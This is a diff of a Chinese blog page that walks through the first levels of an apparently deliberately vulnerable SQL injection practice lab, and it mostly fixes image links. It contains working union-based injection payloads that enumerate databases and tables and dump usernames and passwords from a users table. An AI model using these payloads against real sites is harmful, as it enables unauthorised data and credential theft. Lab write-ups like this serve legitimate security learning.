@@ -97,32 +97,57 @@
 <p>1、在url后加上?id=1,回车，回显正常</p>
 <p>我们尝试在1后面加上’，回车发现页面报错：</p>
 </li>
-<li><p>![20180618230922590](D:\blog\source\images\Camera Roll\20180618230922590.png)</p>
+<li><p><img src="/images/20180618230922590.png" alt="20180618230922590"></p>
 </li>
 </ul>
 <p>2、我们要的就是报错，有报错，就可以根据信息进行相应注入。</p>
 <p>这里提示是语法错误，要我们在“1”附近使用正确语法，这说明这里是单引号’注入。</p>
 <p>那我们来验证一下：用–+把sql后面的语句注释掉，发现回显正常，说明这里是单引号注入实锤：</p>
-<p><img src="../images/20180618230958453.png" alt="20180618230958453"></p>
+<p><img src="/images/20180618230927610.png" alt="20180618230927610"></p>
 <p>3、接着我们就可以使用order by 语句进行判断，该表中一共有几列数据</p>
 <p>从1~3发现回显都正常，4的时候回显示不正常，说明该表一共有3列：</p>
-<p>![20180618230932891](C:\Users\49969\Pictures\Camera Roll\20180618230932891.png)</p>
+<p><img src="/images/20180618230932891.png" alt="20180618230932891"></p>
 <p>4、接着我们要id=1改为一个数据库不存在的值，可以改成负数，0，这里任意输入一个数861，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p>
-<p>![20180618230937963](C:\Users\49969\Pictures\Camera Roll\20180618230937963.png)</p>
+<p><img src="/images/20180618230937963.png" alt="20180618230937963"></p>
 <p>有两个显示位。</p>
 <p>5、然后就可以利用sql查询语句爆破出自己想要的信息：</p>
 <p>我们先爆破出他的数据库名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p>
-<p>![20180618230947113](C:\Users\49969\Pictures\Camera Roll\20180618230947113.png)</p>
+<p><img src="/images/20180618230947113.png" alt="20180618230947113"></p>
 <p>查询security内的所有表名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
-<p>![20180618230958453](C:\Users\49969\Pictures\Camera Roll\20180618230958453.png)</p>
-<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br>![2018061823100417](C:\Users\49969\Pictures\Camera Roll\2018061823100417.png)</p>
+<p><img src="/images/20180618230958453-16329233542211.png" alt="20180618230958453"></p>
+<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
+<p><img src="/images/2018061823100417-16329234868492.png" alt="2018061823100417"></p>
 <p>最后爆出他的username和password:</p>
 <p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users)–+ </p>
 <p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concatpassword) from security.users)–+ </p>
-<p>![2018061823101365](C:\Users\49969\Pictures\Camera Roll\2018061823101365.png)</p>
+<p><img src="/images/2018061823101365-16329234913983.png" alt="2018061823101365"></p>
 <p>至此，第一关结束！</p>
 <hr>
 <p>第二关：</p>
+<p>我们输入?id=1 and1=1,页面回显正常：</p>
+<p><img src="../images/image-20210929222147383.png" alt="image-20210929222147383"></p>
+<p>而当我们改为 and 1=2 时，这里会报错：</p>
+<p> <img src="../images/image-20210929222252888.png" alt="image-20210929222252888"></p>
+<p>说明这里存在数值注入，我们可以打开根目录的源文件验证一下：</p>
+<p><img src="../images/image-20210929222439668.png" alt="image-20210929222439668"></p>
+<p>这里id=$id,我们猜想正确，接下来就可以进行正常注入了，详细步骤参考第一关。</p>
+<hr>
+<p>第三关：</p>
+<p>输入？id=1’:</p>
+<p><img src="../images/image-20210929222902858.png" alt="image-20210929222902858"></p>
+<p>有报错，就说明单字符有戏，我们注释掉看看：</p>
+<p><img src="../images/image-20210929223412686.png" alt="image-20210929223412686"></p>
+<p>发现依然报错，那我们就可以在‘上作文章，尝试在后面加上）：</p>
+<p><img src="../images/image-20210929223519087.png" alt="image-20210929223519087"></p>
+<p>好，再注释掉：</p>
+<p><img src="../images/image-20210929223604583.png" alt="image-20210929223604583"></p>
+<p>回显正常，说明此处是’）的注入，我们打开源文件验证：</p>
+<p><img src="../images/image-20210929223704234.png" alt="image-20210929223704234"></p>
+<p>接下来进行联合，爆破。</p>
+<hr>
+<p>第四关：</p>
+<p>本关使用  (“”)  的方式闭合字符串，然后可以优先使用联合查询注入：</p>
+<p><img src="../images/image-20210929224135650.png" alt="image-20210929224135650"></p>
 
       
     </div>
